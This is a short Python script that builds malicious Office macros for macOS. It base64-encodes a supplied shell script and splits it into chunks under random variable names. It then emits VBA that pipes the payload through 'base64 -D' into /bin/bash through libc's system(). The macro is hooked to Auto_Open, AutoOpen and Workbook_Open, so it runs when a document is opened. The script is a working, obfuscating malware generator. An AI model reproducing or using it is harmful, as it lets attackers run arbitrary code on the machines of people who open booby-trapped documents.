#!/usr/bin/python
import random
import base64 as b64
import string
import sys

def randstring(size=6, chars=string.ascii_lowercase + string.ascii_uppercase):
    return ''.join(random.choice(chars) for _ in range(size))

template = string.Template(""" 
Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long

Sub $funcname()
    Dim a As Long
    Dim $cmdvar As String
    $declare_cmd
    $last
    a = system($cmdvar)
End Sub

Sub Auto_Open()
    $funcname
End Sub

Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub
""")

if len(sys.argv) < 2:
    print("%s <input>" % sys.argv[0])
    exit(-1)

funcname = randstring()
encoded = b64.b64encode( open(sys.argv[1]).read() )
cmdvar = randstring()
step = 70
declare_cmd = "%s = \"echo %s\"" % ( cmdvar, encoded[:step] )
for i in range(step,len(encoded), step):
    if step+i < len(encoded):
        declare_cmd += "\n    %s = %s + \"%s\"" % ( cmdvar,cmdvar, encoded[i:i+step] )
    else:
        declare_cmd += "\n    %s = %s + \"%s\"" % ( cmdvar,cmdvar, encoded[i:] )
        
last = "%(cmdvar)s = %(cmdvar)s + \"|base64 -D |/bin/bash\"" % locals()

print( template.substitute(funcname=funcname, cmdvar=cmdvar, declare_cmd = declare_cmd, last = last) )
